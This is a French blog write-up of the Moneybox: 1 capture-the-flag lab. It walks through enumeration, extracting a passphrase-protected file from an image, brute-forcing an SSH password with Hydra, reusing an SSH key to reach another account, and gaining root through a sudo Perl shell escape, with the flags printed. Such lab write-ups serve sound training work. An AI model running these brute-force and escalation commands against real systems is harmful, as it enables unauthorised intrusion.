{"hash":"b89929ffb278454bd1f8bb0277abaa50df9b43f7","data":{"post":{"title":"CTF Moneybox: 1","date":"9 May 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.1</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.45</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir moneybox1 &amp;&amp; cd moneybox1</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -A -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nPORT   STATE SERVICE VERSION\n<span class=\"token number\">21</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ftp</span>     vsftpd <span class=\"token number\">3.0</span>.3\n<span class=\"token operator\">|</span> ftp-anon: Anonymous FTP login allowed <span class=\"token punctuation\">(</span>FTP code <span class=\"token number\">230</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_-rw-r--r--    <span class=\"token number\">1</span> <span class=\"token number\">0</span>        <span class=\"token number\">0</span>         <span class=\"token number\">1093656</span> Feb <span class=\"token number\">26</span> 09:48 trytofind.jpg\n<span class=\"token operator\">|</span> ftp-syst: \n<span class=\"token operator\">|</span>   STAT: \n<span class=\"token operator\">|</span> FTP server status:\n<span class=\"token operator\">|</span>      Connected to ::ffff:192.168.1.38\n<span class=\"token operator\">|</span>      Logged <span class=\"token keyword\">in</span> as <span class=\"token function\">ftp</span>\n<span class=\"token operator\">|</span>      TYPE: ASCII\n<span class=\"token operator\">|</span>      No session bandwidth limit\n<span class=\"token operator\">|</span>      Session <span class=\"token function\">timeout</span> <span class=\"token keyword\">in</span> seconds is <span class=\"token number\">300</span>\n<span class=\"token operator\">|</span>      Control connection is plain text\n<span class=\"token operator\">|</span>      Data connections will be plain text\n<span class=\"token operator\">|</span>      At session startup, client count was <span class=\"token number\">3</span>\n<span class=\"token operator\">|</span>      vsFTPd <span class=\"token number\">3.0</span>.3 - secure, fast, stable\n<span class=\"token operator\">|</span>_End of status\n<span class=\"token number\">22</span>/tcp <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">7</span>.9p1 Debian <span class=\"token number\">10</span>+deb10u2 <span class=\"token punctuation\">(</span>protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span> ssh-hostkey: \n<span class=\"token operator\">|</span>   <span class=\"token number\">2048</span> 1e:30:ce:72:81:e0:a2:3d:5c:28:88:8b:12:ac:fa:ac <span class=\"token punctuation\">(</span>RSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>   <span class=\"token number\">256</span> 01:9d:fa:fb:f2:06:37:c0:12:fc:01:8b:24:8f:53:ae <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> 2f:34:b3:d0:74:b4:7f:8d:17:d2:37:b1:2e:32:f7:eb <span class=\"token punctuation\">(</span>ED25519<span class=\"token punctuation\">)</span>\n<span class=\"token number\">80</span>/tcp <span class=\"token function\">open</span>  http    Apache httpd <span class=\"token number\">2.4</span>.38 <span class=\"token variable\"><span class=\"token punctuation\">((</span>Debian<span class=\"token punctuation\">))</span></span>\n<span class=\"token operator\">|</span>_http-server-header: Apache/2.4.38 <span class=\"token punctuation\">(</span>Debian<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-title: MoneyBox</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un serveur <strong>FTP</strong> sur le port <strong>21</strong>, un serveur <strong>SSH</strong> sur le port <strong>22</strong> et un serveur <strong>Apache 2</strong> sur le <strong>80</strong>.</p>\n<p>Astuce vous pouvez ajouter le domaine <em>MoneyBox.home</em> dans le fichier <code class=\"language-text\">/etc/hosts</code> avec <strong>Vim</strong> (ou un autre éditeur de texte).</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> <span class=\"token function\">vim</span> /etc/hosts\n<span class=\"token number\">192.168</span>.1.45 MoneyBox.home</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Commençons par énumérer le serveur <strong>FTP</strong> afin de récupérer le fichier \"trytofind.jpg\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ftp</span>\nftp<span class=\"token operator\">></span> <span class=\"token function\">open</span> <span class=\"token variable\">$IP</span>\nConnected to <span class=\"token number\">192.168</span>.1.45.\n<span class=\"token number\">220</span> <span class=\"token punctuation\">(</span>vsFTPd <span class=\"token number\">3.0</span>.3<span class=\"token punctuation\">)</span>\nName <span class=\"token punctuation\">(</span><span class=\"token number\">192.168</span>.1.45:kali<span class=\"token punctuation\">)</span>: anonymous\n<span class=\"token number\">331</span> Please specify the password.\nPassword:\n<span class=\"token number\">230</span> Login successful.\nRemote system <span class=\"token builtin class-name\">type</span> is UNIX.\nUsing binary mode to transfer files.\nftp<span class=\"token operator\">></span> <span class=\"token function\">ls</span> -a\n<span class=\"token number\">200</span> PORT <span class=\"token builtin class-name\">command</span> successful. Consider using PASV.\n<span class=\"token number\">150</span> Here comes the directory listing.\ndrwxr-xr-x    <span class=\"token number\">2</span> <span class=\"token number\">0</span>        <span class=\"token number\">0</span>            <span class=\"token number\">4096</span> Feb <span class=\"token number\">26</span> 09:51 <span class=\"token builtin class-name\">.</span>\ndrwxr-xr-x    <span class=\"token number\">2</span> <span class=\"token number\">0</span>        <span class=\"token number\">0</span>            <span class=\"token number\">4096</span> Feb <span class=\"token number\">26</span> 09:51 <span class=\"token punctuation\">..</span>\n-rw-r--r--    <span class=\"token number\">1</span> <span class=\"token number\">0</span>        <span class=\"token number\">0</span>         <span class=\"token number\">1093656</span> Feb <span class=\"token number\">26</span> 09:48 trytofind.jpg\n<span class=\"token number\">226</span> Directory send OK.\nftp<span class=\"token operator\">></span> get trytofind.jpg\nftp<span class=\"token operator\">></span> <span class=\"token builtin class-name\">exit</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>La photo récupérée représente un chat en hoodie tapant sur un clavier d'un pc portable. On check la présence d'informations dans les données <strong>Exif</strong> <code class=\"language-text\">exiftool trytofind.jpg pas d&#39;exif</code> sans succès.<br>\nOn poursuit avec <strong>Nikto</strong> pour scanner la sécurité du serveur <strong>Apache</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nikto -h http://<span class=\"token variable\">$IP</span>\n+ Server: Apache/2.4.38 <span class=\"token punctuation\">(</span>Debian<span class=\"token punctuation\">)</span>\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class=\"token keyword\">in</span> a different fashion to the MIME <span class=\"token builtin class-name\">type</span>\n+ No CGI Directories found <span class=\"token punctuation\">(</span>use <span class=\"token string\">'-C all'</span> to force check all possible <span class=\"token function\">dirs</span><span class=\"token punctuation\">)</span>\n+ Server may leak inodes via ETags, header found with <span class=\"token function\">file</span> /, inode: 26d, size: 5bc3f995481cd, mtime: <span class=\"token function\">gzip</span>\n+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD\n+ OSVDB-3233: /icons/README: Apache default <span class=\"token function\">file</span> found.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Rien de croustillant. Scannons les pages avec <strong>Gobuster</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ gobuster <span class=\"token function\">dir</span> -u http://<span class=\"token variable\">$IP</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.xml,.js\n/index.html           <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">200</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">621</span><span class=\"token punctuation\">]</span>\n/blogs                <span class=\"token punctuation\">(</span>Status: <span class=\"token number\">301</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">[</span>Size: <span class=\"token number\">312</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>--<span class=\"token operator\">></span> http://192.168.1.45/blogs/<span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>La page <a href=\"http://MoneyBox.home/blogs\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">/blogs</a> retourne un chemin dans le code source (en scrollant) <code class=\"language-text\">&lt;!--the hint is the another secret directory is S3cr3t-T3xt--&gt;</code>. La page <a href=\"http://moneybox.home/S3cr3t-T3xt\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">/S3cr3t-T3xt</a> retourne un code dans le code source (en scrollant) <code class=\"language-text\">&lt;!..Secret Key 3xtr4ctd4t4 &gt;</code>.</p>\n<p>Testons la présence d'un fichier dans l'image récupérée du serveur <strong>FTP</strong> avec l'outil <strong>Steghide</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ steghide --extract -sf trytofind.jpg\nEntrez la passphrase: 3xtr4ctd4t4\n�criture des donn�es extraites dans <span class=\"token string\">\"data.txt\"</span><span class=\"token builtin class-name\">.</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>Dans le fichier \"data.txt\", on apprend la présence d'un éventuel utilisateur \"renu\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> data.txt              \nHello<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>.  renu\n\n      I tell you something Important.Your Password is too Week So Change Your Password\nDon't Underestimate it<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>.</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Avec cette information, tentons un brute force sur le serveur <strong>SSH</strong> avec <strong>Hydra</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ hydra -l renu -P /usr/share/wordlists/rockyou.txt <span class=\"token variable\">$IP</span> -t <span class=\"token number\">4</span> -V <span class=\"token function\">ssh</span>\n<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>ssh<span class=\"token punctuation\">]</span> host: <span class=\"token number\">192.168</span>.1.45   login: renu   password: <span class=\"token number\">987654321</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Après quelques minutes, <strong>Hydra</strong> trouve le mot de passe de cet utilisateur : \"987654321\".</p>\n<h2>Pénétration</h2>\n<p>On se connecte en <strong>SSH</strong> avec l'utilisateur \"renu\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ssh</span> renu@<span class=\"token variable\">$IP</span>\n<span class=\"token punctuation\">[</span>STATUS<span class=\"token punctuation\">]</span> <span class=\"token number\">4781466.33</span> tries/min, <span class=\"token number\">14344399</span> tries <span class=\"token keyword\">in</span> 00:03h, <span class=\"token number\">1</span> to <span class=\"token keyword\">do</span> <span class=\"token keyword\">in</span> 00:01h, <span class=\"token number\">1</span> active\nrenu@192.168.1.45's password: <span class=\"token number\">987654321</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>On trouve facilement le flag user présent dans le fichier \"user1.txt\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> user1.txt\nYes<span class=\"token punctuation\">..</span>.<span class=\"token operator\">!</span>\nYou Got it User1 Flag\n\n <span class=\"token operator\">==</span><span class=\"token operator\">></span> us3r1<span class=\"token punctuation\">{</span>F14g:0ku74tbd3777y4<span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2>Escalation</h2>\n<p>L'utilisateur \"renu\" n'a pas accès à <strong>sudo</strong> mais il y a une autre utilisatrice... \"lily\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ls</span> -la /home\ndrwxr-xr-x  <span class=\"token number\">4</span> lily lily <span class=\"token number\">4096</span> Feb <span class=\"token number\">26</span> 09:06 lily</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Dans son dossier on trouve un second flag dans le fichier \"user2.txt\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /home/lily/user2.txt\nYeah<span class=\"token punctuation\">..</span><span class=\"token punctuation\">..</span>.\nYou Got a User2 Flag\n\n<span class=\"token operator\">==</span><span class=\"token operator\">></span> us3r<span class=\"token punctuation\">{</span>F14g:tr5827r5wu6nklao<span class=\"token punctuation\">}</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>La clef de l'utilisateur \"renu\" apparait dans le fichier \"authorized_keys\" de \"lily\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /home/lily/.ssh/authorized_keys\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRIE9tEEbTL0A+7n+od9tCjASYAWY0XBqcqzyqb2qsNsJnBm8cBMCBNSktugtos9HY9hzSInkOzDn3RitZJXuemXCasOsM6gBctu5GDuL882dFgz962O9TvdF7JJm82eIiVrsS8YCVQq43migWs6HXJu+BNrVbcf+xq36biziQaVBy+vGbiCPpN0JTrtG449NdNZcl0FDmlm2Y6nlH42zM5hCC0HQJiBymc/I37G09VtUsaCpjiKaxZanglyb2+WLSxmJfr+EhGnWOpQv91hexXd7IdlK6hhUOff5yNxlvIVzG2VEbugtJXukMSLWk2FhnEdDLqCCHXY+1V+XEB9F3 renu@debian</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Donc on peut se connecter en <strong>SSH</strong> sur le compte de l'utilisatrice \"lily\" <code class=\"language-text\">ssh lily@localhost</code>.<br>\nUtilisatrice qui a le droit d'exécuter <strong>sudo</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> -l\nUser lily may run the following commands on MoneyBox:\n    <span class=\"token punctuation\">(</span>ALL <span class=\"token builtin class-name\">:</span> ALL<span class=\"token punctuation\">)</span> NOPASSWD: /usr/bin/perl</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>On peut exécuter du <strong>Perl</strong> en tant que <strong>sudo</strong> avec ce compte. Commande ci-dessous que l'on récupère sur <a href=\"https://gtfobins.github.io/gtfobins/perl/#sudo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GTFOBins</a>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> perl -e <span class=\"token string\">'exec \"/bin/sh\";'</span>\n$ python3 -c <span class=\"token string\">'import pty;pty.spawn(\"/bin/bash\")'</span>\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Désormais root, on peut accèder au contenu du dernier flag.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /root/.root.txt\nH4ckth3p14n3t</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n","download":"https://www.vulnhub.com/entry/moneybox-1,653","tags":[{"title":"Pentest","path":"/tag/Pentest/"},{"title":"CTF","path":"/tag/CTF/"}],"timeToRead":6,"parts":[]}},"context":{}}